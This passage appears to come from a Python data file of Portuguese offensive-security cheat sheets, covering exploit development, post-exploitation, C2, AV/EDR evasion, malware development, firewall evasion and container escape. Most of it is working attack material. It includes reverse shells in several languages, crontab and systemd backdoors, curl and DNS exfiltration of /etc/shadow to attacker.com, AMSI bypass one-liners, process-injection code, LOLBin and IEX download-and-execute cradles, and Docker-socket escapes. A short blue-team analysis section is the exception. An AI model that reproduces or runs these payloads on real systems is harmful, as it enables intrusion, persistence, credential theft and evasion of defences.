  jmp_esp = b"\\xAF\\x11\\x50\\x62"    # endereço em little-endian
  nop_sled = b"\\x90" * 16
  shellcode = b"..."                    # output do msfvenom
  payload = b"A" * offset + jmp_esp + nop_sled + shellcode

## Protecções e Bypass
  checksec --file=vuln               # ver protecções activas

  NX/DEP (Non-Executable Stack):
    → Bypass: ROP (Return Oriented Programming)
    → Encadear gadgets que terminam em "ret"
    ROPgadget --binary vuln --rop

  ASLR (Address Space Layout Randomization):
    → Bypass: info leak para calcular base address
    → Ou: ret2libc (usar funções de libc em vez de shellcode)
    → ret2plt + ret2libc:
      pop_rdi = 0x...    # gadget: pop rdi; ret
      puts_plt = elf.plt['puts']
      main = elf.symbols['main']
      payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], puts_plt, main)

  Stack Canary:
    → Bypass: bruteforce (fork servers), info leak, format string

  PIE (Position Independent Executable):
    → Bypass: info leak do endereço base

## Ferramentas Essenciais
  pwndbg / peda / pwndbg → GDB melhorado para exploit dev
  pwntools (Python):
    from pwn import *
    p = process('./vuln')          # ou remote('ip', port)
    elf = ELF('./vuln')
    libc = ELF('./libc.so.6')
    p.sendline(payload)
    p.interactive()

  ROPgadget, ropper       → encontrar gadgets ROP
  one_gadget              → magic gadget para shell em libc
  checksec                → análise de protecções
  Immunity Debugger + Mona.py (Windows)

## Format String Vulnerability
  # Identificar: printf(user_input) em vez de printf("%s", user_input)
  python3 -c "print('%p.'*20)" | ./vuln    # leak de stack
  python3 -c "print('%s')" | ./vuln        # ler string
  # Escrever em endereço arbitrário com %n
  # pwntools: fmtstr_payload(offset, {target_addr: value})""", {"category": "exploit_dev"}),

    ("api_hacking", """API Hacking - Testes de Segurança em APIs:

## Reconhecimento e Enumeração
  # Descobrir endpoints
  gobuster dir -u https://api.target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
  ffuf -w endpoints.txt -u https://api.target.com/FUZZ -mc 200,201,401,403
  # Encontrar documentação exposta
  /swagger.json  /swagger-ui.html  /api-docs  /openapi.json  /graphql
  # Análise de JS para endpoints hidden
  linkfinder.py -i https://target.com -d

## Autenticação e Autorização
  # JWT Attacks
  # 1. Algoritmo "none" (sem assinatura)
  header = base64({"alg":"none","typ":"JWT"})
  payload = base64({"user":"admin","role":"admin"})
  token = header + "." + payload + "."
  # 2. Crack de chave fraca
  hashcat -m 16500 jwt.txt rockyou.txt
  # 3. Confusão RS256 → HS256 (usar chave pública como segredo HMAC)
  # Ferramentas: jwt_tool, jwt.io

  # API Key expostas
  grep -r "api_key\|Authorization\|Bearer" js_files/
  # Verificar em headers, cookies, URL params, body

  # BOLA (Broken Object Level Authorization) = IDOR em APIs
  GET /api/v1/users/1337/orders   → tentar /api/v1/users/1/orders
  GET /api/v1/invoice/84523       → incrementar/decrementar ID

## Fuzzing de Parâmetros
  # Mass Assignment - enviar campos não esperados
  POST /api/register
  {"username":"user","password":"pass","role":"admin","isAdmin":true}
  # HTTP Method Tampering
  GET /api/admin/users → tentar PUT, DELETE, PATCH
  # Content-Type Switch
  application/json → application/xml (XXE), text/plain

## GraphQL
  # Introspection query (mapear schema completo)
  {"query":"{__schema{types{name fields{name}}}}"}
  # Ferramentas
  graphw00f                        # fingerprint GraphQL engine
  InQL (Burp extension)           # análise de schema
  clairvoyance                     # introspection bypass
  # Vulnerabilidades comuns:
  # - Introspection activa em produção
  # - Mutations sem autenticação
  # - Batch queries (rate limit bypass)
  # - IDOR via node IDs

## Rate Limiting Bypass
  X-Forwarded-For: 127.0.0.1      # spoofar IP origem
  X-Real-IP: 1.2.3.4
  # Usar IPs diferentes em cada request
  # Distribuir requests ao longo do tempo

## Ferramentas
  Burp Suite Pro + API Scanner
  Postman + Collection Runner
  mitmproxy                        # proxy para interceptar APIs mobile
  Arjun                            # descobrir parâmetros HTTP hidden
    arjun -u https://api.target.com/endpoint
  kiterunner                       # brute force de rotas API com contexto
    kr scan https://api.target.com -w routes-large.kite
  jwt_tool                         # análise e ataque de JWT
  RESTler                          # fuzzer automático para REST APIs

## OWASP API Top 10
  API1  - BOLA (Broken Object Level Authorization)
  API2  - Broken Authentication
  API3  - Broken Object Property Level Authorization
  API4  - Unrestricted Resource Consumption
  API5  - Broken Function Level Authorization
  API6  - Unrestricted Access to Sensitive Business Flows
  API7  - SSRF
  API8  - Security Misconfiguration
  API9  - Improper Inventory Management
  API10 - Unsafe Consumption of APIs""", {"category": "api"}),

    ("iot_hacking", """IoT Hacking - Internet of Things:

## Reconhecimento de Dispositivos IoT
  # Shodan para encontrar dispositivos expostos
  shodan search "default password" port:23
  shodan search product:"webcamXP"
  shodan search "Server: Router" country:PT
  # Nmap para IoT local
  nmap -sV -p 23,80,443,554,8080,8443 192.168.1.0/24
  # Protocolos comuns: Telnet(23), MQTT(1883), CoAP(5683), Zigbee, Z-Wave

## Firmware Analysis
  # Extrair firmware
  binwalk -e firmware.bin           # extrair filesytem
  binwalk -Me firmware.bin          # extracção recursiva
  # Analisar conteúdo
  find . -name "*.conf" -o -name "*.cfg" | xargs grep -i password
  find . -name "shadow" -o -name "passwd"
  strings firmware.bin | grep -i "password\|admin\|secret\|key"
  # Emular firmware
  qemu-arm-static ./squashfs-root/bin/busybox
  # Firmwalker - script de análise automática
  ./firmwalker.sh squashfs-root/ output.txt

## Análise de Tráfego IoT
  # MQTT (protocolo pub/sub IoT)
  mosquitto_sub -h <broker_ip> -t "#" -v    # subscrever TODOS os tópicos
  mosquitto_pub -h <broker_ip> -t "home/lights" -m "ON"
  # Wireshark filters para IoT
  mqtt          # protocolo MQTT
  coap          # CoAP (Constrained Application Protocol)
  modbus        # SCADA/ICS
  dnp3          # sistemas de controlo industrial

## Ataques Comuns IoT
  # 1. Credenciais default
  admin:admin, admin:password, root:root, admin:1234
  # Listas: https://github.com/shodanista/iot-default-passwords
  # 2. Telnet/SSH aberto
  hydra -l admin -P rockyou.txt telnet://192.168.1.1
  # 3. Web interface vulnerável
  # Procurar: command injection em ping/traceroute, LFI, XSS stored
  # 4. APIs REST sem autenticação
  curl http://camera.local/api/snapshot     # snapshot sem auth
  curl http://router.local/cgi-bin/admin    # painel admin exposto

## Hardware Hacking Básico
  # UART (acesso a console serial)
  # Identificar pinos: GND, VCC, TX, RX com multímetro
  # Ligar com conversor USB-UART (CP2102, CH340)
  minicom -D /dev/ttyUSB0 -b 115200
  screen /dev/ttyUSB0 115200
  # JTAG - debugging e dump de memória
  # OpenOCD para acesso JTAG

  # SPI/I2C Flash dump
  # Ler chip de memória flash diretamente com Bus Pirate ou flashrom
  flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware_dump.bin

## Análise de Aplicações Mobile IoT
  # Apps de controlo IoT têm frequentemente:
  # - API keys hardcoded
  # - Endpoints não documentados
  # - Comunicação sem TLS
  jadx-gui companion_app.apk
  grep -r "192.168\|10.0.0\|mqtt\|amqp" decompiled/

## Ferramentas IoT
  Binwalk          → análise e extracção de firmware
  Firmwalker       → análise automática de filesystem
  FACT             → Firmware Analysis and Comparison Tool
  RouterSploit     → framework de exploits para routers
    rsf > use scanners/autopwn
    rsf > set target 192.168.1.1
    rsf > run
  Expliot          → framework pentest IoT/SCADA
  MQTT Explorer    → GUI para explorar brokers MQTT
  Attify Badge     → hardware para análise UART/JTAG/SPI""", {"category": "iot"}),

    ("post_exploitation", """Post Exploitation - Após Acesso Inicial:

## Enumeração Pós-Comprometimento
  # Linux
  id && whoami && hostname             # utilizador e host
  uname -a && cat /etc/os-release     # OS e kernel
  ip a && route -n && cat /etc/hosts  # rede
  ps aux && netstat -tulpn            # processos e portas
  find / -writable -type f 2>/dev/null | grep -v proc
  cat ~/.bash_history                  # histórico de comandos
  env && printenv                      # variáveis de ambiente

  # Windows
  whoami /all                          # utilizador + privilégios + grupos
  systeminfo                           # OS, patches, arquitectura
  ipconfig /all && route print        # rede
  netstat -ano                         # conexões activas
  tasklist /svc                        # processos e serviços
  net user && net localgroup administrators
  dir /s /b C:\\Users\\*password*      # ficheiros com password no nome

## Persistência Linux
  # Crontab
  (crontab -l; echo "* * * * * /bin/bash -i >& /dev/tcp/IP/4444 0>&1") | crontab -
  # SSH authorized_keys
  echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
  # Serviço systemd
  cat > /etc/systemd/system/backdoor.service << EOF
  [Service]
  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'
  Restart=always
  EOF
  systemctl enable backdoor
  # LD_PRELOAD backdoor, PAM backdoor, motd backdoor

## Persistência Windows
  # Registry Run Keys
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\evil.exe"
  # Scheduled Task
  schtasks /create /tn "WindowsUpdate" /tr "C:\evil.exe" /sc onlogon /ru SYSTEM
  # Serviço Windows
  sc create backdoor binpath= "C:\evil.exe" start= auto
  # WMI Event Subscription (furtivo)
  # Startup folder
  copy evil.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

## Lateral Movement
  # Pass-the-Hash
  crackmapexec smb 192.168.1.0/24 -u Administrator -H <hash> --local-auth
  # Pass-the-Ticket (Kerberos)
  # Overpass-the-Hash (PTH → TGT)
  sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> /run:cmd.exe
  # Remote Execution
  psexec.py domain/user:pass@target cmd.exe
  wmiexec.py domain/user:pass@target
  evil-winrm -i target -u user -p pass
  # SSH Agent Forwarding (Linux lateral)
  ssh -A user@pivot && ssh user@internal_host

## Exfiltração de Dados
  # DNS exfil
  cat /etc/passwd | xxd -p | tr -d '\n' | fold -w 63 | while read l; do nslookup $l.attacker.com; done
  # HTTP exfil
  curl -X POST https://attacker.com/exfil -d @/etc/shadow
  # ICMP exfil
  ping -c 1 attacker.com -p $(xxd -p /etc/passwd | head -c 16)
  # Encoding para evasão
  base64 /etc/shadow | curl -X POST https://attacker.com/ -d @-

## Dump de Credenciais
  # Linux
  cat /etc/shadow                      # hashes locais (root)
  cat /proc/*/environ | tr '\0' '\n' | grep -i pass  # env vars
  find / -name "*.conf" | xargs grep -l "password" 2>/dev/null
  # Memória de processos
  procdump -p <PID>                    # dump de processo
  # Windows
  mimikatz: sekurlsa::logonpasswords   # LSASS dump
  mimikatz: lsadump::sam               # hashes SAM
  # Dump LSASS sem mimikatz
  tasklist | findstr lsass
  procdump.exe -ma lsass.exe lsass.dmp
  pypykatz lsa minidump lsass.dmp      # parse offline

## Pivoting e Tunneling
  # SSH Tunneling
  ssh -L 8080:internal:80 user@pivot            # local forward
  ssh -R 4444:localhost:4444 user@attacker      # remote forward
  ssh -D 1080 user@pivot                        # SOCKS proxy
  # Chisel (TCP/UDP tunnel via HTTP)
  # Servidor (attacker): chisel server -p 8080 --reverse
  # Cliente (victim): chisel client attacker:8080 R:socks
  # Proxychains
  proxychains nmap -sT -Pn internal_host
  # Ligolo-ng (proxy Layer 3 - melhor para pivoting complexo)""", {"category": "post_exploitation"}),

    ("c2_frameworks", """C2 Frameworks - Command and Control:

## Conceito C2
  Arquitectura C2:
  Attacker → C2 Server ← Beacon/Agent (na máquina comprometida)
  O beacon faz check-in periódico (pull model) para evadir firewalls
  Comunicação tipicamente via HTTP/HTTPS/DNS para parecer tráfego legítimo

## Cobalt Strike (padrão da indústria)
  # Conceitos core:
  Teamserver   → servidor C2 central (corre no attacker)
  Beacon       → payload implantado na vítima
  Listener     → define como o beacon comunica (HTTP, HTTPS, DNS, SMB)
  Profile      → Malleable C2 Profile (personaliza tráfego HTTP)

  # Comandos Beacon essenciais:
  sleep 60 10          # check-in a cada 60s com 10% jitter
  shell whoami         # executar comando shell
  powershell Get-Process  # executar PowerShell
  upload / download    # transferir ficheiros
  socks 1080           # SOCKS proxy via beacon
  jump psexec target   # lateral movement
  spawn smb            # criar beacon SMB (lateral interno)
  screenshot / keylogger
  hashdump / logonpasswords (via BOF)
  execute-assembly SharpHound.exe  # .NET in-memory

## Sliver (open-source, alternativa ao CS)
  # Instalar
  curl https://sliver.sh/install | sudo bash
  sliver-server          # iniciar servidor
  sliver-client          # conectar ao servidor

  # Gerar implant
  generate --mtls attacker.com:443 --os windows --arch amd64 --save implant.exe
  generate --http attacker.com --os linux --save implant_linux

  # Listeners
  mtls --lport 443      # mTLS listener
  http --lport 80       # HTTP listener
  https --lport 443     # HTTPS listener
  dns --domains evil.com  # DNS listener

  # Sessão activa
  sessions              # listar sessões
  use <session_id>      # entrar na sessão
  info / whoami / pwd / ls
  execute -o whoami
  upload / download
  socks5 start --host 127.0.0.1 --port 1080

## Havoc (open-source, moderno)
  # Daemon C2 + Havoc Client (GUI)
  # Suporta: HTTP/S, agentes em C, evasão moderna
  # Extendível com plugins Python

## Metasploit como C2
  # Multi-handler para receber beacons
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_https
  set LHOST 0.0.0.0
  set LPORT 443
  set ExitOnSession false
  run -j
  # Sessions
  sessions -l
  sessions -i 1
  # Upgrade shell para meterpreter
  sessions -u 1

## Empire / Starkiller (PowerShell/Python C2)
  # Empire server + Starkiller (GUI)
  # Listeners HTTP/HTTPS/Redirectors
  # Stagers: PowerShell one-liner, macro, HTA, BAT
  # Módulos pós-exploração integrados

## DNS C2 (evasão de firewalls)
  # Tráfego codificado em queries DNS TXT/CNAME
  # Passa em quase todos os firewalls
  # iodine, dnscat2
  dnscat2-server evil.com              # servidor DNS
  dnscat2 --dns server=attacker,domain=evil.com  # cliente

## Redirectors e Evasão
  # Redirector HTTP (Apache mod_rewrite)
  # Filtra tráfego legítimo → redirige só beacons para C2 real
  # Categorizar domínio C2 (domain fronting)
  # JA3/JA3S fingerprint evasão → usar profiles Malleable
  # Sleep + jitter → evitar detecção por beaconing regular
  # Process injection → injectar em processos legítimos (explorer, svchost)
  # HTTPS com certificado válido (Let's Encrypt) → parece tráfego normal

## OPSEC Básico C2
  - Usar domínios com categorização web válida (comprar domínios antigos)
  - C2 nunca directamente exposto → redirector na frente
  - Jitter alto em beacons (30-50%)
  - Comunicar apenas em horário de trabalho (sleep night)
  - Apagar logs e artefactos após uso
  - Usar canais legítimos: Teams/Slack webhooks, GitHub, OneDrive""", {"category": "c2"}),

    ("av_evasion", """Evasão de Antivírus e EDR - AV/EDR Evasion:

## Como AV/EDR Detecta Ameaças
  1. Assinaturas estáticas (hash, sequências de bytes conhecidas)
  2. Heurística (comportamento suspeito em análise)
  3. Sandbox dinâmica (executa o sample e observa)
  4. EDR: hooking de syscalls, telemetria em tempo real
  5. AMSI (Antimalware Scan Interface) no Windows

## Evasão Estática - Ofuscação de Payload

  # Encriptação XOR simples (C)
  key = 0xAA
  for i in range(len(shellcode)):
      shellcode[i] ^= key
  # Decifrar em runtime antes de executar

  # Ferramentas de ofuscação
  Donut       → converte EXE/.NET em shellcode
  ScareCrow   → payload generator com evasão avançada
  Freeze      → suspende processos + injecta
  Nimcrypt2   → encripta shellcode, gera loader em Nim
  Msfvenom encoders (menos eficazes contra AV moderno):
    msfvenom -p ... -e x64/xor_dynamic -i 10 -f exe

## AMSI Bypass (PowerShell/VBA/.NET)
  # Patch em memória do amsi.dll (PowerShell)
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

  # Obfuscado (mais eficaz):
  $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
  $b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
  $b.SetValue($null,$true)

  # Outras técnicas AMSI:
  # - Patch de bytes no amsi.dll em memória
  # - Forçar erro no AmsiScanBuffer → retorna AMSI_RESULT_CLEAN
  # - Matt Graeber one-liner (detectado, mas conceito base)

## ETW (Event Tracing for Windows) Bypass
  # Patch EtwEventWrite → NOP em memória
  # Cega telemetria de EDR que usa ETW
  # PowerShell:
  [Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null
  # Patch do ntdll.EtwEventWrite para retornar imediatamente

## Process Injection (injectar em processo legítimo)
  Técnicas clássicas:
  VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

  Técnicas modernas (menos dectáveis):
  Process Hollowing  → criar processo suspenso, substituir imagem
  Thread Hijacking   → suspender thread existente, modificar RIP
  APC Injection      → queue de APC em thread alertável
  Module Stomping    → sobrescrever DLL legítima em memória
  Phantom DLL        → mapear DLL não usada e injectar

  # C básico - Remote Thread Injection:
  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  LPVOID addr = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProc, addr, shellcode, len, NULL);
  CreateRemoteThread(hProc, NULL, 0, addr, NULL, 0, NULL);

## Syscalls Directas (bypass de EDR hooks)
  # EDR faz hook em funções de ntdll.dll (userland)
  # Bypass: chamar syscalls directamente sem passar por ntdll
  # Ferramentas/técnicas:
  SysWhispers2/3  → gera ASM com syscall IDs directos
  Hell's Gate     → resolve SSNs (Syscall Service Numbers) em runtime
  Halo's Gate     → resolve SSNs mesmo com hooks
  Tartarus Gate   → via Heaven's Gate (x86 em x64)

## Living Off The Land (LOLBins)
  # Usar binários legítimos do Windows para executar payloads
  certutil -urlcache -f http://attacker/shell.exe shell.exe
  certutil -decode encoded.b64 shell.exe
  regsvr32 /s /n /u /i:http://attacker/evil.sct scrobj.dll
  mshta http://attacker/evil.hta
  rundll32 javascript:"\..\mshtml,RunHTMLApplication"
  wmic process call create "powershell -enc <base64>"
  # Lista completa: lolbas-project.github.io

## Obfuscação PowerShell
  # Invoke-Obfuscation
  Invoke-Obfuscation → TOKEN, STRING, ENCODING, COMPRESS, LAUNCHER
  # AMSI + obfuscação + execução em memória:
  IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
  # Execução via variável de ambiente, char array, concat

## Ferramentas de Teste AV
  VirusTotal         → não usar com payloads reais (submissão pública)
  AntiScan.me        → não partilha amostras
  antiscan.me        → testa contra 30+ AV sem distribuir
  Kleenscan          → alternativa privada
  # Sempre testar em VM isolada antes de usar em engagement""", {"category": "av_evasion"}),

    ("malware_development", """Malware Development - Red Team (uso autorizado):

## Linguagens para Malware/Implants
  C/C++     → controlo total, baixo nível, nativo
  Rust      → seguro, binários pequenos, detecção baixa
  Nim       → compila para C, boa evasão, sintaxe limpa
  Go        → cross-compile fácil, binários estáticos
  C#/.NET   → integração Windows nativa, execute-assembly

## Reverse Shell Manual (sem msfvenom)

  # Python
  python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('IP',4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh'])"

  # Bash
  bash -i >& /dev/tcp/IP/4444 0>&1

  # PowerShell
  $c=New-Object Net.Sockets.TCPClient('IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($rb);$s.Write($sb,0,$sb.Length)}

  # Netcat
  nc -e /bin/bash IP 4444
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444>/tmp/f

## Dropper Simples em C (Windows)
  #include <windows.h>
  #include <wininet.h>
  // 1. Download payload da net
  // 2. VirtualAlloc com PAGE_EXECUTE_READWRITE
  // 3. Copiar shellcode para memória
  // 4. Criar thread para executar
  // Compilar: x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -lwininet

## Loader em Go (cross-platform)
  package main
  import (
    "encoding/hex"
    "syscall"
    "unsafe"
  )
  // shellcode em hex → decrypt → VirtualAlloc → RtlMoveMemory → syscall

## Keylogger Básico (Windows - C)
  SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)
  // Callback captura teclas → escreve para ficheiro/envia via HTTP

## Técnicas de Persistência em Malware
  # Fileless malware - reside apenas em memória
  # Nada escrito em disco → difícil de detectar com AV tradicional
  # Técnicas: Process Hollowing, Reflective DLL Injection
  # PowerShell em memória via IEX

  # Auto-delete após execução
  MoveFileEx(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)  # apaga no reboot

## Comunicação C2 Furtiva
  # HTTPS com certificate pinning
  # Mimicking de tráfego legítimo (User-Agent, timing, headers)
  # Canais alternativos:
  DNS TXT records    → exfiltrar dados em queries DNS
  ICMP               → payload em echo requests
  Slack/Teams API    → C2 via webhook legítimo
  Twitter DMs        → C2 via API (visto em APTs reais)
  GitHub Gists       → C2 pull-based (check gist para comandos)

## Detecção e Análise de Malware (Blue Team)
  # Análise estática
  strings malware.exe | grep -i "http\|cmd\|powershell"
  PEStudio           → análise PE estática
  FLOSS              → extrair strings ofuscadas
  capa               → detectar capabilities automaticamente

  # Análise dinâmica
  ProcMon + ProcExp  → ver processos, registry, ficheiros
  Wireshark          → tráfego de rede
  ANY.RUN            → sandbox interactiva online
  Cuckoo Sandbox     → sandbox local automatizada
  x64dbg / OllyDbg   → debugging de malware

## Ferramentas Red Team Dev
  Donut              → shellcode de .NET/EXE/DLL
  ScareCrow          → evasão avançada, múltiplos loaders
  BruteRatel C4      → C2 + malware dev framework
  Havoc              → open-source, agentes em C
  NimPlant           → implant em Nim com C2 integrado
  SharpCollection    → colecção de ferramentas .NET ofensivas""", {"category": "malware_dev"}),

    ("firewall_evasion", """Evasão de Firewall e Network Evasion:

## Conceitos Base
  Firewalls inspeccionam: porta, protocolo, IP origem/destino
  IDS/IPS inspeccionam: payload, padrões, anomalias
  DPI (Deep Packet Inspection): analisa conteúdo do pacote
  Objectivo: fazer tráfego malicioso parecer legítimo

## Nmap - Evasão de Firewall e IDS

  # Fragmentação de pacotes (dificulta DPI)
  nmap -f target                        # fragmentar em 8 bytes
  nmap -f -f target                     # fragmentar em 16 bytes
  nmap --mtu 24 target                  # MTU customizado (múltiplo de 8)

  # Decoys (falsificar IPs de origem)
  nmap -D RND:10 target                 # 10 IPs aleatórios + o teu
  nmap -D 1.2.3.4,5.6.7.8,ME target   # decoys específicos

  # Source Port spoofing (parecer DNS, HTTP)
  nmap --source-port 53 target          # parecer DNS
  nmap --source-port 80 target          # parecer HTTP
  nmap -g 443 target                    # shorthand

  # Timing lento (evitar threshold de IDS)
  nmap -T0 target                       # paranoid: 5 min entre probes
  nmap -T1 target                       # sneaky: 15 seg entre probes
  nmap --scan-delay 1s target           # delay customizado

  # Idle Scan (completamente furtivo - usa IP zombie)
  nmap -sI zombie_ip target             # o teu IP nunca aparece nos logs

  # Dados aleatórios para confundir IDS
  nmap --data-length 25 target          # adicionar bytes aleatórios
  nmap --badsum target                  # checksums errados (ver resposta)
  nmap --randomize-hosts -iL hosts.txt  # randomizar ordem de hosts

## Port Knocking
  # Bater em portas numa sequência específica para abrir porta
  knock target 7000 8000 9000           # sequência de knock
  nmap -Pn --host-timeout 201 --max-retries 0 -p 7000 target
  nmap -Pn --host-timeout 201 --max-retries 0 -p 8000 target
  nmap -Pn --host-timeout 201 --max-retries 0 -p 9000 target

## Tunneling para Bypass de Firewall

  # DNS Tunneling (porta 53 quase sempre aberta)
  iodine -f -P password dns.attacker.com    # cliente
  iodined -f -P password 10.0.0.1 dns.attacker.com  # servidor
  dnscat2 --dns server=attacker.com,port=53  # C2 via DNS

  # ICMP Tunneling (ping sempre permitido)
  ptunnel -p proxy_host -lp 8000 -da dest -dp 22  # SSH via ICMP
  icmptunnel                                        # tunnel IP over ICMP

  # HTTP/HTTPS Tunneling (porta 80/443 sempre aberta)
  stunnel                               # encapsular qualquer protocolo em TLS
  proxytunnel -p proxy:8080 -d target:22 -a 2222  # SSH via HTTP CONNECT

  # SSH como proxy universal
  ssh -D 1080 user@server               # SOCKS5 proxy
  ssh -L 3389:internal:3389 user@jump  # RDP via SSH
  ssh -R 4444:localhost:4444 user@attacker  # reverse tunnel

  # Chisel (HTTP tunnel com auth)
  chisel server -p 80 --auth user:pass  # servidor
  chisel client http://server:80 --auth user:pass R:socks  # cliente SOCKS

## Evasão de IDS/IPS

  # Fragmentação ao nível da aplicação
  # Dividir payload HTTP em múltiplos pacotes
  # IDS não consegue reconstituir em tempo real

  # Encoding e ofuscação de payload
  # URL encoding: ../etc/passwd → ..%2Fetc%2Fpasswd
  # Double encoding: %252F em vez de %2F
  # Unicode: ..%c0%afetc%c0%afpasswd

  # Evasão de Snort/Suricata
  # Alterar User-Agent para um não monitorizados
  # Fragmentar shellcode em múltiplos requests
  # Usar protocolo inesperado na porta (HTTP na 8443)
  # Adicionar headers legítimos para confundir assinaturas

  # Polimorfismo de payload
  # Encriptar payload + dropper que decifra em runtime
  # Cada execução gera binário diferente (evitar hash matching)

## SSL/TLS para Evasão
  # Encapsular C2 em HTTPS legítimo
  # Usar certificado válido (Let's Encrypt)
  # Domain fronting: usar CDN (Cloudflare, AWS CloudFront)
  #   SNI aponta para domínio legítimo, Host header aponta para C2
  # JA3 fingerprint bypass: usar perfis Malleable CS para mudar JA3

## Proxychains e Anonimato
  # /etc/proxychains.conf
  socks5 127.0.0.1 1080                # proxy local (SSH -D ou Chisel)
  # Encadear múltiplos proxies
  proxychains4 -f proxychains.conf nmap -sT -Pn target
  proxychains4 curl http://target
  proxychains4 sqlmap -u "http://target?id=1"

  # Tor para anonimato
  torify nmap -sT target               # nmap via Tor (só TCP)
  torsocks curl http://target          # HTTP via Tor

## Evasão de WAF (Web Application Firewall)
  # Case variation: SeLeCt iNsTeAd De SELECT
  # Comments: SE/**/LECT, SELECT/*!32302 1*/
  # Encoding: URL, HTML entities, hex
  # HTTP Parameter Pollution: ?id=1&id=2
  # Chunked Transfer Encoding
  # Alterar Content-Type para confundir parser
  # Ferramentas: wafw00f (detectar WAF), sqlmap --tamper

## Ferramentas de Network Evasion
  ncat --ssl target 443                # netcat com SSL
  socat openssl:target:443 -          # socat via SSL
  hping3 -S -p 80 --scan 1-1000 target  # scan com hping3 (mais controlo)
  scapy                                # craft de pacotes custom em Python
  fragroute                            # fragmentação automática de tráfego""", {"category": "network_evasion"}),

    ("docker_privesc", """Docker - Escape de Container e Privilege Escalation:

## Verificar se Estás num Container
  cat /proc/1/cgroup | grep docker     # ver cgroup docker
  ls /.dockerenv                       # ficheiro presente em containers
  hostname                             # nome gerado aleatoriamente
  cat /proc/self/status | grep CapEff  # capacidades do processo

## Misconfigurations que Permitem Escape

  # 1. Container com --privileged flag
  # Acesso total ao host - escape trivial
  fdisk -l                             # ver discos do host
  mkdir /mnt/host && mount /dev/sda1 /mnt/host
  chroot /mnt/host                     # root no host
  # Ou via cgroups:
  mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
  # Escrever processo para executar no host

  # 2. Docker Socket montado (/var/run/docker.sock)
  ls /var/run/docker.sock              # verificar se existe
  # Se sim: controlo total do Docker daemon = root no host
  docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \
    -v /:/host ubuntu chroot /host bash

  # 3. Capabilities perigosas
  capsh --print | grep Current         # ver capabilities
  # CAP_SYS_ADMIN → quase root
  # CAP_NET_ADMIN → manipular rede
  # CAP_SYS_PTRACE → ptrace de processos host

  # 4. Volume mount do host
  # Se /etc ou / do host estiver montado:
  echo "user ALL=(ALL) NOPASSWD:ALL" >> /mnt/host/etc/sudoers
  # Ou adicionar chave SSH a /mnt/host/root/.ssh/authorized_keys

  # 5. Namespace sharing (--pid=host, --net=host)
  # Com --pid=host: acesso a processos do host
  nsenter --target 1 --mount --uts --ipc --net --pid -- bash

## CVEs Docker Conhecidos
  CVE-2019-5736 (runc escape) → sobrescrever binário runc do host
  CVE-2020-15257 (Containerd UNIX socket) → escape via API exposta
  CVE-2022-0492 (cgroup v1) → escape via cgroup release_agent

## Enumeração dentro do Container
  env | grep -i "pass\|key\|secret\|token\|db"   # vars de ambiente
  cat /proc/1/environ | tr '\0' '\n'              # env do processo 1
  mount | grep -v "proc\|sys\|dev\|cgroup"        # volumes montados
  ip route && cat /etc/hosts                      # rede e hosts conhecidos
  # Procurar outros containers acessíveis na rede interna
  nmap -sn 172.17.0.0/16                         # scan rede docker default

## Docker API Exposta
  # Docker daemon sem autenticação (porta 2375 TCP)
  curl http://target:2375/version
  docker -H tcp://target:2375 ps
  docker -H tcp://target:2375 run -it --privileged -v /:/host ubuntu chroot /host bash

## Ferramentas
  deepce.sh      → docker enumeration e escape automático
  CDK (Container Deployment Kit) → framework de escape
  amicontained   → verificar isolamento do container
  trivy          → scan de vulnerabilidades em imagens""", {"category": "docker"}),

    ("kubernetes_privesc", """Kubernetes - Privilege Escalation e Ataque:

## Reconhecimento Inicial (dentro de um Pod)
  # Service Account token (montado automaticamente)
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
  cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

  # API Server (normalmente acessível internamente)
  APISERVER=https://kubernetes.default.svc
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -k $APISERVER/api --header "Authorization: Bearer $TOKEN"

  # Verificar permissões do Service Account
  kubectl auth can-i --list                        # o que posso fazer?
  kubectl auth can-i create pods
  kubectl auth can-i get secrets

## Enumeração com kubectl
  kubectl get pods --all-namespaces               # todos os pods
  kubectl get secrets --all-namespaces            # segredos
  kubectl get serviceaccounts --all-namespaces    # service accounts
  kubectl get clusterrolebindings                 # bindings globais
  kubectl get nodes                               # nós do cluster
  kubectl describe pod <nome>                     # detalhes do pod
  kubectl get configmaps --all-namespaces         # configurações

## Privilege Escalation via RBAC Misconfiguration

  # 1. Criar Pod privilegiado (se tens create pods)
  kubectl apply -f - <<EOF
  apiVersion: v1
